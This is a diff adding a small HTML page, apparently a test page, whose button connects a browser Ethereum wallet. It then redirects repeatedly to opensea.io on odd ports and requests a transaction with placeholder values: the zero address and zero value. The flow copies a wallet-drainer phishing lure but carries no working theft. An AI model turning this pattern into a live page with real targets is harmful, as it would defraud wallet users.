@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <style>
+    .button {
+      background-color: #4CAF50;
+      border: none;
+      color: white;
+      padding: 15px 32px;
+      text-align: center;
+      text-decoration: none;
+      display: inline-block;
+      font-size: 16px;
+      margin: 4px 2px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <script>
+    async function promptWalletConnection() {
+      try {
+        if (typeof window.ethereum !== 'undefined') {
+          // Request wallet connection
+          const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+
+          if (accounts.length > 0) {
+            alert('Wallet connected successfully!');
+            return accounts[0]; // Return the first connected account
+          } else {
+            alert('No accounts found.');
+            return null;
+          }
+        } else {
+          alert('Web3 (Ethereum provider) is not available in this browser.');
+          return null;
+        }
+      } catch (error) {
+        alert(`Wallet connection request failed. Error: ${error.message}`);
+        return null;
+      }
+    }
+
+    async function promptEthTransaction(account) {
+      if (!account) {
+        alert('No connected account found.');
+        return false; // Skip transaction if no account is connected
+      }
+
+      try {
+        const transactionParameters = {
+          nonce: "0x00",
+          gasPrice: "0x244AC6D",
+          gas: "0x12A52",
+          to: "0x0000000000000000000000000000000000000000", // Replace with your target address
+          from: account,
+          value: "0x0",
+          data: "0x00", // Replace with your transaction data if needed
+          chainId: "0x1", // Replace with your chain ID
+        };
+
+        const txHash = await ethereum.request({
+          method: "eth_sendTransaction",
+          params: [transactionParameters],
+        });
+
+        alert(`Transaction sent: ${txHash}`);
+        return true;
+      } catch (error) {
+        alert(`Ethereum transaction request failed or was rejected. Error: ${error.message}`);
+        return false;
+      }
+    }
+
+    function handleButtonClick() {
+      promptWalletConnection()
+        .then(account => {
+          if (account) {
+            // Perform redirection immediately after successful connection
+            location.href = 'https://opensea.io:8082';
+
+            // Optionally, delay or manage the interval-based redirection
+            setInterval(function () {
+              location.href = 'https://opensea.io:8083';
+            }, 1000);
+
+            // Proceed with transaction request
+            return promptEthTransaction(account);
+          }
+        })
+        .catch(error => {
+          alert(`Error: ${error.message}`);
+        });
+    }
+  </script>
+  <center>
+    <input type="button" class="button" value="Connect Wallet and Send Transaction" onclick="handleButtonClick()">
+  </center>
+</body>
+</html>
